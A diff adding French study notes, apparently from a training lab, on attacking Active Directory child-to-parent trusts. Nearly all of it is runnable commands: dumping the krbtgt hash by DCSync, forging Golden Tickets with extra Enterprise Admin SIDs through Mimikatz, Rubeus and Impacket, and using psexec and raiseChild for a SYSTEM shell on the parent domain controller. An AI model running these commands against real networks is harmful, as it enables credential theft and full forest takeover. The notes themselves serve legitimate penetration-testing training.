@@ -2003,7 +2003,149 @@ netdom query /domain:inlanefreight.local workstation
 
 ---
 
+# Attacking Domain Trusts - Child → Parent Trusts (Windows)
 
+## SID History Primer
 
+- Le champ **sidHistory** est utilisé lors de migrations.  
+- Si un utilisateur est migré d’un domaine vers un autre, son ancien SID est ajouté à l’attribut `sidHistory` de son nouveau compte.  
+- Cela lui permet de garder l’accès aux ressources de l’ancien domaine.  
+- En abusant de ça (SID History Injection), on peut ajouter un **SID d’admin** dans le token d’un utilisateur contrôlé.
+
+## ExtraSids Attack (Mimikatz)
+
+- Dans un même **forest**, le `sidHistory` est respecté (sauf si **SID Filtering** activé).  
+- On peut injecter le SID du groupe **Enterprise Admins** du domaine parent dans un compte enfant.  
+- Résultat : le compte enfant obtient les mêmes droits que les Enterprise Admins (full forest compromise).
+
+### Pré-requis
+
+- Le hash `KRBTGT` du child domain.  
+- Le `SID` du child domain.  
+- Le nom d’un utilisateur (même fictif).  
+- Le FQDN du child domain.  
+- Le `SID` du groupe Enterprise Admins du parent domain.  
+
+## Étapes de l’attaque
+
+### 1. Récupérer le hash NT du compte KRBTGT (child domain)
+
+`mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`
+
+→ Donner le NT hash `9d765b482771505cbe97411065964d5f`
+
+### 2. Obtenir le SID du child domain (PowerView)
+
+`Get-DomainSID`  
+→ Exemple : `S-1-5-21-2806153819-209893948-922872689`
+
+### 3. Obtenir le SID du groupe Enterprise Admins (parent domain) (PowerView)
+
+`Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins"`  
+→ Exemple : `S-1-5-21-3842939050-3880317879-2865463114-519`
+
+### 4. Vérifier qu’on n’a pas accès au DC parent
+
+`ls \\academy-ea-dc01.inlanefreight.local\c$`  
+→ Access Denied
+
+### 5. Créer un Golden Ticket avec Mimikatz
+
+`kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`
+
+- Injecter le ticket en mémoire (`Pass The Ticket`).
+
+### 6. Vérifier le ticket en mémoire
+
+`klist`
+
+## Résultat
+
+- On a un TGT valide avec droits **Enterprise Admins**.  
+- On peut accéder aux ressources du parent domain, par ex. :  
+
+`ls \\academy-ea-dc01.inlanefreight.local\c$`
+
+## Variante : Rubeus
+
+Même attaque possible avec Rubeus :  
+
+`.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`
+
+Puis vérifier avec `klist`.
+
+## DCSync sur le parent domain
+
+Avec le ticket injecté :  
+
+`mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL`
+
+→ Donne le NTLM hash du compte `lab_adm` (Domain Admin).
+
+---
+
+# Attacking Domain Trusts - Child → Parent Trusts - from Linux
+
+On peut aussi faire l’attaque depuis un hôte Linux.  
+Il faut rassembler :
+
+- le hash **KRBTGT** du domaine enfant  
+- le **SID** du domaine enfant  
+- un **nom d’utilisateur cible** (peu importe qu’il existe)  
+- le **FQDN** du domaine enfant  
+- le **SID du groupe Enterprise Admins** du domaine parent  
+
+## Étape 1 - DCSync avec `secretsdump.py`
+
+`secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`
+
+Résultat : dump du hash NTLM du compte `krbtgt`.
+
+## Étape 2 - Trouver le SID du domaine avec `lookupsid.py`
+
+`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
+
+Retourne :  
+`[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689`
+
+Pour ne garder que ça :  
+`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"`
+
+## Étape 3 - SID du domaine parent + Enterprise Admins
+
+`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
+
+Exemple :  
+`S-1-5-21-3842939050-3880317879-2865463114-519`
+
+## Étape 4 - Créer un Golden Ticket avec `ticketer.py`
+
+`ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`
+
+Produit un fichier `hacker.ccache`.
+
+## Étape 5 - Charger le ticket et tester l’accès
+
+Exporter le ticket :  
+`export KRB5CCNAME=hacker.ccache`
+
+Tester un accès parent DC avec `psexec.py` :  
+`psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`
+
+Succès → shell **SYSTEM** sur `ACADEMY-EA-DC01`.
+
+## Étape 6 - Automatiser avec `raiseChild.py`
+
+`raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`
+
+Ce script :  
+1. Récupère le SID Enterprise Admins du parent  
+2. Dump le hash `krbtgt` enfant  
+3. Forge un Golden Ticket  
+4. Auth dans le domaine parent  
+5. Récupère les creds admin du parent  
+6. Lance un `psexec` sur le DC parent  
+
+---
 
 
